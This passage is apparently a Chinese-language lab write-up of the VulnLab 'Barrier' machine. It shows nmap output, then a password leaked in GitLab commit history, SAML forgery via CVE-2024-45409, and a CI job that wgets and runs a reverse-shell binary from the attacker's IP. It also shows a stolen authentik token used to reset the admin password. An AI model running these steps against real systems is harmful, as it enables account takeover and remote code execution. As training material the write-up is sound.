CnLkySq8NMfIx7yQ5YuRa4kMeQIDAQABoyAwHjAcBgNVHREEFTATghFnaXRsYWIu</span><br><span class="line">| YmFycmllci52bDANBgkqhkiG9w0BAQsFAAOCAQEAt3T5e4zTPayl/oSOzerZkQBY</span><br><span class="line">| IVbyvutz3SepgmvUYk01wtFUJpFTyAEB34xmo9bt1+0WpXszYwYosahJ7VAnJfNu</span><br><span class="line">| a0umR4i42OyXz2LufCSty4g/G41Moy7/uwSvm010Cl2zt4YmezcGHiDSDPhST28+</span><br><span class="line">| 7zkOsdL8S/q6LTVdpYbAJsKTN4war/nsav79HWzGlI+Lf7GTJs1RZPusvULEVzom</span><br><span class="line">| lkysZD+jLOLvtPHZ23jQXu+qB5M/EzX24pfjMn73L6uKIG0QJIXeEIHjmPHJoSsH</span><br><span class="line">| iLc3uby34UeemYGHZJHL+0XyKYdeHkLxxMwWIFMAAFi/cGjMjova4+HdkkmUNw==</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">8080/tcp open  http                syn-ack ttl 63 Apache Tomcat</span><br><span class="line">|_http-title: Apache Tomcat</span><br><span class="line">| http-methods:</span><br><span class="line">|_  Supported Methods: OPTIONS GET HEAD POST</span><br><span class="line">9000/tcp open  cslistener?         syn-ack ttl 62</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Fri, 10 Jan 2025 22:57:19 GMT</span><br><span class="line">|     Location: /flows/-/default/authentication/?next=/</span><br><span class="line">|     Referrer-Policy: same-origin</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Authentik-Id: 72e652298c174d92a5bdc467dff9fb51</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|     X-Powered-By: authentik</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Fri, 10 Jan 2025 22:57:20 GMT</span><br><span class="line">|     Location: /flows/-/default/authentication/?next=/</span><br><span class="line">|     Referrer-Policy: same-origin</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Authentik-Id: 4ba1384196df4300b8c9af99c417848b</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|_    X-Powered-By: authentik</span><br><span class="line">9443/tcp open  ssl/tungsten-https? syn-ack ttl 62</span><br><span class="line">| ssl-cert: Subject: commonName=authentik default certificate/organizationName=authentik</span><br><span class="line">| Subject Alternative Name: DNS:*</span><br><span class="line">| Issuer: commonName=authentik default certificate/organizationName=authentik</span><br><span class="line">| Public Key type: rsa</span><br><span class="line">| Public Key bits: 2048</span><br><span class="line">| Signature Algorithm: sha256WithRSAEncryption</span><br><span class="line">| Not valid before: 2025-01-10T22:46:36</span><br><span class="line">| Not valid after:  2026-01-10T22:46:36</span><br><span class="line">| MD5:   7e22:9a23:0be1:2d3e:76fe:2356:cab4:ee9f</span><br><span class="line">| SHA-1: b6d4:e209:cd1f:1fad:92a2:824e:0c16:0f78:17c5:0648</span><br><span class="line">| -----BEGIN CERTIFICATE-----</span><br><span class="line">| MIIDRTCCAi2gAwIBAgIQXu7brRaDZc7j5qgfEYA+hjANBgkqhkiG9w0BAQsFADA8</span><br><span class="line">| MRIwEAYDVQQKEwlhdXRoZW50aWsxJjAkBgNVBAMTHWF1dGhlbnRpayBkZWZhdWx0</span><br><span class="line">| IGNlcnRpZmljYXRlMB4XDTI1MDExMDIyNDYzNloXDTI2MDExMDIyNDYzNlowPDES</span><br><span class="line">| MBAGA1UEChMJYXV0aGVudGlrMSYwJAYDVQQDEx1hdXRoZW50aWsgZGVmYXVsdCBj</span><br><span class="line">| ZXJ0aWZpY2F0ZTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBAK2kp196</span><br><span class="line">| 1/ENuFXF5xPjeG53906oDpBklHS+wrJpsLn//7nPekHbhS4tg6Bfs/wZUgipeAMI</span><br><span class="line">| iG4OasjZTcI1tg5GAUAi2un+43zsCI+BnGAn7pHbaq/KtOOYwxoOFsuRYaCCI09P</span><br><span class="line">| yyxkMuHMcP1xNZEkv4T7sbk7/Y2X9DO2ELJelOuiwWSbDkHwqYzqjHclJbKmPYYu</span><br><span class="line">| rlOjAfMjXXLcnl0+46NSayYzHody48hybKU29Mcld5ljf0839zCFaYoK5VKcaBuH</span><br><span class="line">| 1TIOur9GVoeTPYu7+4VsyezMpsd2SEqh62y52XN0MyoazeOn0KKwgnwc2wEasVuK</span><br><span class="line">| BCsRSJ9PnjIkSDMCAwEAAaNDMEEwDgYDVR0PAQH/BAQDAgWgMBMGA1UdJQQMMAoG</span><br><span class="line">| CCsGAQUFBwMBMAwGA1UdEwEB/wQCMAAwDAYDVR0RBAUwA4IBKjANBgkqhkiG9w0B</span><br><span class="line">| AQsFAAOCAQEAD2Mi8USdnGvzRNPN0JfcUxGgzuqGcgUV9xEL21QAVO49Lru8R3+6</span><br><span class="line">| FjYQrTWBbX3y200b1PVycY4ydZOabExqUdGPtZoH5QkqYXd+/75nexOi6ld8yYJI</span><br><span class="line">| gakF/41t1L6J9vijvISo9oOHiewHl+cz6Gu0wVUgo353i4JMvcvGhv8OITmntXui</span><br><span class="line">| hxTEBJ83XhyoyudbdEHfQfWkNRivHlJfj1t09eAdL8d7tvEvIX5uAdk+Ja1wYn8B</span><br><span class="line">| KUFdND6/iNasOxhw3elyaehIplpzbWJR8RDSC7L1amKXPlVV8vFmeTsJa43/9yLv</span><br><span class="line">| K5bEB43AuIuQpfmbLpWvL+2fvT9/T2uzYA==</span><br><span class="line">|_-----END CERTIFICATE-----</span><br><span class="line">| fingerprint-strings:</span><br><span class="line">|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:</span><br><span class="line">|     HTTP/1.1 400 Bad Request</span><br><span class="line">|     Content-Type: text/plain; charset=utf-8</span><br><span class="line">|     Connection: close</span><br><span class="line">|     Request</span><br><span class="line">|   GetRequest:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Fri, 10 Jan 2025 22:57:22 GMT</span><br><span class="line">|     Location: /flows/-/default/authentication/?next=/</span><br><span class="line">|     Referrer-Policy: same-origin</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Authentik-Id: 8f50229d1f8644b48124b87fe17da861</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|     X-Powered-By: authentik</span><br><span class="line">|   HTTPOptions:</span><br><span class="line">|     HTTP/1.0 302 Found</span><br><span class="line">|     Content-Length: 0</span><br><span class="line">|     Content-Type: text/html; charset=utf-8</span><br><span class="line">|     Date: Fri, 10 Jan 2025 22:57:23 GMT</span><br><span class="line">|     Location: /flows/-/default/authentication/?next=/</span><br><span class="line">|     Referrer-Policy: same-origin</span><br><span class="line">|     Vary: Accept-Encoding</span><br><span class="line">|     Vary: Cookie</span><br><span class="line">|     X-Authentik-Id: 372a8299493d4b3b97c85d4c8ee68aad</span><br><span class="line">|     X-Content-Type-Options: nosniff</span><br><span class="line">|     X-Frame-Options: DENY</span><br><span class="line">|_    X-Powered-By: authentik</span><br></pre></td></tr></table></figure>
+
+<h1 id="Gitlab"><a href="#Gitlab" class="headerlink" title="Gitlab"></a>Gitlab</h1><p>直接輸入 IP，會跳轉到 <code>gitlab.barrier.vl</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065403-b150coc.png" alt="image">​</p>
+<h2 id="Found-satoru-account-password-on-commit-history"><a href="#Found-satoru-account-password-on-commit-history" class="headerlink" title="Found satoru account password on commit history"></a>Found satoru account password on commit history</h2><p>如果直接點及左下角的 <code>Explore</code>​ 則會跳到公開的項目：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065419-saeqkap.png" alt="image">​</p>
+<p>可以看到裏面有一個項目是屬於 <code>satoru</code>​ 的，點開后看到有兩個 commits 的歷史記錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065438-5n0vmiv.png" alt="image">​</p>
+<p>其中第一個歷史記錄有關於  <code>satoru</code>​ 的賬號密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065456-u22afqi.png" alt="image">​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x27;username&#x27;: &#x27;satoru&#x27;,</span><br><span class="line">&#x27;password&#x27;: &#x27;dGJ2V72SUEMsM3Ca&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>‍</p>
+<p>機器開放了 8080 端口，但是現在沒有管理員後臺賬號密碼：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065532-l8cdbkl.png" alt="image">​</p>
+<h2 id="Login-authentik-as-satoru"><a href="#Login-authentik-as-satoru" class="headerlink" title="Login authentik as satoru"></a>Login authentik as satoru</h2><p>在 9000 端口中有一個 <code>authentik</code>​ 的服務運行著：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065615-xzpxlss.png" alt="image">​</p>
+<p>如果嘗試使用上面gitlab項目中的密碼 <code>satoru : dGJ2V72SUEMsM3Ca</code>​ 可以成功的登陸：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065642-c2ldjjm.png" alt="image">​</p>
+<p>登陸後裏面有兩個應用程序，如果點擊 <code>Guacamole</code>​ 則什麽也沒有：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111065850-z40kt7r.png" alt="image">​</p>
+<p>所以嘗試點擊 <code>Gitlab</code>​，來到這個頁面，可以看到是以 <code>satoru</code>​ 的身份登陸的：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075943-z9d1cdf.png" alt="image">​</p>
+<p>在 Gitlab 中如果登陸了可以在 Help 中查看版本：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111073141-whjxpq5.png" alt="image">​</p>
+<p>如果沒登陸的話會是這樣：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111073301-lrkapdb.png" alt="image">​</p>
+<h2 id="Exploit-CVE-2024-45409-and-login-as-akadmin"><a href="#Exploit-CVE-2024-45409-and-login-as-akadmin" class="headerlink" title="Exploit CVE-2024-45409 and login as akadmin"></a>Exploit CVE-2024-45409 and login as akadmin</h2><p>既然有了版本就可以嘗試搜索一下相關的 exploit，由於登錄是經過 <code>authentik</code>​ 也就是 SSO ，所以關鍵字會嘗試搜索 <code>SSO</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111073339-cgjb1oq.png" alt="image">​</p>
+<p>結果看到了：</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/">https://about.gitlab.com/releases/2024/09/17/patch-release-gitlab-17-3-3-released/</a></p>
+</li>
+<li><p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/CVE-2024-45409">https://github.com/synacktiv/CVE-2024-45409</a></p>
+</li>
+</ul>
+<p>看起來這個關於是 gitlab 的漏洞，準確來説是 <code>Ruby SAML library</code>​ ：</p>
+<blockquote>
+<p>This exploit injects the <code>DigestValue</code>​ of the modified assertion into the <code>StatusDetail</code>​ element, allowing it to smuggle the XPath selector that will use this value instead of the one in the <code>SignedInfo</code>​ block.</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/synacktiv/CVE-2024-45409">https://github.com/synacktiv/CVE-2024-45409</a></p>
+</blockquote>
+<p>通過描述也就是使用 SSO 進行登錄的時候，可以利用 <code>CVE-2024-45409</code>​ 來僞造任意用戶。</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111074953-br0gw9l.png" alt="image">​</p>
+<h3 id="Founding-admin-username"><a href="#Founding-admin-username" class="headerlink" title="Founding admin username"></a>Founding admin username</h3><p>但問題是需要僞造哪個用戶呢？</p>
+<p>可以嘗試通過 gitlab 的自動填充來發現所有用戶，點擊項目的 <code>Manage</code>​ 下面的 <code>Members</code>​，然後點擊右上角的  <code>Invite members</code>​：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075116-u1261gd.png" alt="image">​</p>
+<p>這個時候如果輸入 <code>@</code>​ 就會搜索其他的用戶：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075124-gdoujrs.png" alt="image">​</p>
+<p>從名字上可以得知 <code>akadmin</code>​ 應該就是 gitlab 的管理員，所以嘗試僞造 <code>akadmin</code>​ 的用戶登錄。</p>
+<h3 id="Logout-and-Using-SSO-login-again-and-intercept-SAMLResponse"><a href="#Logout-and-Using-SSO-login-again-and-intercept-SAMLResponse" class="headerlink" title="Logout and Using SSO login again and intercept SAMLResponse"></a>Logout and Using SSO login again and intercept SAMLResponse</h3><p>首先先登出：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075925-krzv3q2.png" alt="image">​</p>
+<p>在使用 SSO 進行登錄，由於登錄會經過 <code>authentik</code>​ ，而驗證身份也會在 <code>authentik</code>​。儅驗證通過後 <code>authentik</code>​ 會通過 url 的 <code>SAMLResponse</code>​ 傳遞簽名后的 payload 給 gitlab，gitlab會嘗試核對這段 payload 有沒有被進行修改（也就是 <code>&lt;SignedInfo&gt;</code>​）。核對完成后沒有被修改就會以 payload 裏面的用戶名進行登錄。</p>
+<p>但如果 gitlab 核對這段payload時的程序有bug，如果能找到一種方法就可以繞過核對，這樣就可以以任意用戶登錄。（這就是 <code>CVE-2024-45409</code>​ 的原理）</p>
+<p>所以如果使用 burp 進行攔截請求，可以看到<code>authentik</code>​ 驗證完成后會將用戶名簽名打包並前面進去xml，然後通過<code>SAMLResponse</code>​傳遞給 github：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111075828-fapnni3.png" alt="image">​</p>
+<p>從 HTTP 頭文件看到這段 payload 經過 <code>flate</code>​ 壓縮：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111080025-om9lrs5.png" alt="image">​</p>
+<p>所以可以使用 cyberchef 進行base64解碼后再解壓：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111080054-xelv927.png" alt="image">​</p>
+<h3 id="Exploiting-CVE-2024-45409"><a href="#Exploiting-CVE-2024-45409" class="headerlink" title="Exploiting CVE-2024-45409"></a>Exploiting CVE-2024-45409</h3><p>然後把解密后的内容保存到 <code>request.xml</code>​，保存好了之後使用 <code>CVE-2024-45409.py</code>​ 僞造 <code>akadmin</code>​：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ python3 CVE-2024-45409.py -r request.xml -n akadmin -e -o save.xml</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111081432-05xjw5q.png" alt="image">​</p>
+<p>然後會得到經過 base64 編碼后的文件：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111081447-91onqtw.png" alt="image">​</p>
+<p>如果把這堆東西替換掉<code>authentik</code>​ 傳遞給 github 的 <code>SAMLResponse</code>​，則會成功的以 <code>akadmin</code>​ 登錄：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111081416-y6mpo48.png" alt="image">​</p>
+<p>一開始嘗試僞造 <code>akadmin@barrier.vl</code>​ 不過失敗了，出現了 <code>500</code>​ 錯誤代碼，所以嘗試去掉域名，結果成功了。</p>
+<p>大概的操作如下：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/demo1-20250111082213-s7468h2.gif" alt="demo1">​</p>
+<h2 id="Login-as-akadmin"><a href="#Login-as-akadmin" class="headerlink" title="Login as akadmin"></a>Login as akadmin</h2><p>成功的使用管理員 <code>akadmin</code>​ 登錄到後臺后，看到 gitlab 部署了一個 gitlab-runner：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082517-h9zf4vm.png" alt="image">​</p>
+<p>點擊後發現是暫停的狀態：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082536-3uod89z.png" alt="image">​</p>
+<p>所以嘗試點擊開始：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082614-ee6sawb.png" alt="image">​</p>
+<p>如果點擊名字會看到他是以 docker 的方式來運行項目裏的自動化脚本：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111083633-o3p2q3y.png" alt="image">​</p>
+<p>換句話就是你寫好的一個自動化脚本 <code>.gitlab-ci.yml</code>​ ，無論如何都會在docker裏面運行，所以可以嘗試創建一個自動化脚本并且獲得一個reverse shell，看看裏面有什麽。</p>
+<h2 id="Create-a-project-and-execute-command-via-runner"><a href="#Create-a-project-and-execute-command-via-runner" class="headerlink" title="Create a project and execute command via runner"></a>Create a project and execute command via runner</h2><p>首先先創建一個空白項目：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111082708-b5506i3.png" alt="image">​</p>
+<p>點擊新建的項目，嘗試寫一個自動化的脚本，并且保存成<code>.gitlab-ci.yml</code>​</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">stages:</span><br><span class="line">  - build</span><br><span class="line"></span><br><span class="line">build_job:</span><br><span class="line">  stage: build</span><br><span class="line">  tags:</span><br><span class="line">    - auto_5e7f</span><br><span class="line">  script:</span><br><span class="line">    - echo &quot;Compiling the code...&quot;</span><br><span class="line">    - echo &quot;Code compiled successfully&quot;</span><br></pre></td></tr></table></figure>
+
+<p>然後點擊 commit 就可以提交到 gitlab：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111083933-wndj2hv.png" alt="image">​</p>
+<p>但是這樣會報錯：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111083950-iyscfe6.png" alt="image">​</p>
+<p>由於默認是以 <code>alpine</code>​ 的鏡像去運行的，但是系統中沒有<code>alpine</code>​ 的鏡像，這個系統也不能聯網，於是只能猜裏面有什麽鏡像。</p>
+<h2 id="Guessing-docker-image-name"><a href="#Guessing-docker-image-name" class="headerlink" title="Guessing docker image name"></a>Guessing docker image name</h2><p>如何猜？首先這個系統裏面安裝了<code>authentik</code>​、<code>tomcat</code>​、<code>gitlab</code>​ 以及 <code>Guacamole</code>​。如果這些都是使用 <code>docker</code>​ &#x2F; <code>docker-compose</code>​ 來部署的，就會預先 pull 一個鏡像到系統。</p>
+<p>所以可以先嘗試搜索 <code>authentik</code>​ 的 docker-compose 文件中會用到哪些鏡像：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090515-yt2tvjm.png" alt="image">​</p>
+<p>看到官網有一個 <code>docker-compose.yml</code>​ 可以快速部署：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090533-vrawpqv.png" alt="image">​</p>
+<p>打開這個鏈接一看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090559-6zakmqo.png" alt="image">​</p>
+<p>裏面有 <code>postgres:16-alpine</code>​，所以嘗試在 <code>.gitlab-ci.yml</code>​ 中指定 image，commit 后：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111090054-49dhffr.png" alt="image">​</p>
+<p>可以看到系統中還真有<code>postgres:16-alpine</code>​，所以脚本如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">stages:</span><br><span class="line">  - build</span><br><span class="line"></span><br><span class="line">build_job:</span><br><span class="line">  stage: build</span><br><span class="line">  image: postgres:16-alpine</span><br><span class="line">  tags:</span><br><span class="line">    - auto_5e7f</span><br><span class="line">  script:</span><br><span class="line">    - wget 10.8.4.212/mane -O /tmp/mane</span><br><span class="line">    - chmod 777 /tmp/mane</span><br><span class="line">    - ls -l /tmp</span><br><span class="line">    - /tmp/mane</span><br></pre></td></tr></table></figure>
+
+<p>這樣就可以獲得 reverse shell。</p>
+<h2 id="Got-reverse-shell-on-runner-and-found-authentik-token-on-environmental-variable"><a href="#Got-reverse-shell-on-runner-and-found-authentik-token-on-environmental-variable" class="headerlink" title="Got reverse shell on runner and found authentik token on environmental variable"></a>Got reverse shell on runner and found authentik token on environmental variable</h2><p>拿到了shell之後看一下變量：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ env </span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111092111-wess4lb.png" alt="image">​</p>
+<p>看到有 <code>AUTHENTIK_TOKEN</code>​：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AUTHENTIK_TOKEN=MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc</span><br></pre></td></tr></table></figure>
+
+<p>既然是 token ，那就可以嘗試交互 <code>authentik</code>​，首先要確定這個token是不是真的，其次才開始看API可以做些什麽。</p>
+<h1 id="Playaround-authentik-API"><a href="#Playaround-authentik-API" class="headerlink" title="Playaround authentik API"></a>Playaround authentik API</h1><p>在官方文檔中，看到 <a target="_blank" rel="noopener" href="https://docs.goauthentik.io/docs/developer-docs/api/reference/admin-apps-list">admin_apps_list </a>可以列出所有的應用程序：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111092529-paka7yk.png" alt="image">​</p>
+<p>那就可以直接試一下 token 是不是能用的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L &#x27;http://barrier.vl:9000/api/v3/admin/apps/&#x27; \</span><br><span class="line">-H &#x27;Accept: application/json&#x27; \</span><br><span class="line">-H &#x27;Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111092556-8cuffls.png" alt="image">​</p>
+<h2 id="Change-admin-password"><a href="#Change-admin-password" class="headerlink" title="Change admin password"></a>Change admin password</h2><p>看起來可以用，因爲嘗試交互 <a target="_blank" rel="noopener" href="https://docs.goauthentik.io/docs/developer-docs/api/reference/admin-apps-list">admin_apps_list</a>，也就是說這個 token 應該是有管理員權限的，所以繼續找一下，發現：</p>
+<ul>
+<li>修改密碼： <a target="_blank" rel="noopener" href="https://docs.goauthentik.io/docs/developer-docs/api/reference/core-users-set-password-create">https://docs.goauthentik.io/docs/developer-docs/api/reference/core-users-set-password-create</a></li>
+<li>列出所有用戶： <a target="_blank" rel="noopener" href="https://docs.goauthentik.io/docs/developer-docs/api/reference/core-users-list">https://docs.goauthentik.io/docs/developer-docs/api/reference/core-users-list</a></li>
+</ul>
+<p>這幾個看起來很有用，如果可以修改掉管理員的密碼就可以直接進入<code>authentik</code>​的後臺，就不需要太折騰 API。</p>
+<p>首先列出一下所有賬戶的列表：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L &#x27;http://barrier.vl:9000/api/v3/core/users/&#x27; \                                                                                                                                                      </span><br><span class="line">-H &#x27;Accept: application/json&#x27; \                                                                                                                                                                                </span><br><span class="line">-H &#x27;Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc&#x27; | jq</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093014-4fk2viz.png" alt="image">​</p>
+<p>由於修改密碼需要 id，但是上面的請求中沒有 id，只有pk，所以猜測 id 就是 pk。</p>
+<p>從上面的結果中可以看出 管理員叫 <code>akadmin</code>​，id，也就是pk 是 <code>4</code>​，所以嘗試使用 api 來修改密碼：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ curl -L &#x27;http://barrier.vl:9000/api/v3/core/users/4/set_password/&#x27; \</span><br><span class="line">-H &#x27;Content-Type: application/json&#x27; \</span><br><span class="line">-H &#x27;Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc&#x27; \</span><br><span class="line">-d &#x27;&#123;</span><br><span class="line">  &quot;password&quot;: &quot;MANEtesting123!@#&quot;</span><br><span class="line">&#125;&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093246-ddcff4r.png" alt="image">​</p>
+<h2 id="Login-as-akadmin-to-got-admin"><a href="#Login-as-akadmin-to-got-admin" class="headerlink" title="Login as akadmin to got admin"></a>Login as akadmin to got admin</h2><p>結果什麽返回都沒有，看起來是修改成功了，然後嘗試登錄 <code>authentik</code>​ 看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093409-sge755l.png" alt="image">​</p>
+<p>結果真的進入了後臺：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093451-7q49qu3.png" alt="image">​</p>
+<p>但是點擊 <code>Guacamole</code>​ 還是什麽也沒有：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093930-wp6iq8y.png" alt="image">​</p>
+<p>所以進入 <code>authentik</code>​ 的管理員後臺看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111093501-v46tve7.png" alt="image">​</p>
+<p>左邊的 <code>Directory</code>​ 中可以列出所有用戶：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094205-77ph7p2.png" alt="image">​</p>
+<h2 id="Impersonate-maki-and-login-guacamole"><a href="#Impersonate-maki-and-login-guacamole" class="headerlink" title="Impersonate maki and login guacamole"></a>Impersonate maki and login guacamole</h2><p>點擊  <code>Impersonate</code>​ 就可以以某個用戶登錄，由於 <code>maki</code>​ 用戶還沒有進去過 <code>Guacamole</code>​，嘗試<code>Impersonate</code>​ 該用戶并且進去看看：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094224-bll9og8.png" alt="image">​</p>
+<p>結果發現了有一個鏈接：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094245-j4ud0ry.png" alt="image">​</p>
+<p>點擊後如果出現：</p>
+<p>​<img src="https://relay-img.manesec.com/maneblog/2025/15-vulnlab-Barrier/image-20250111094306-k0xn410.png" alt="image">​</p>
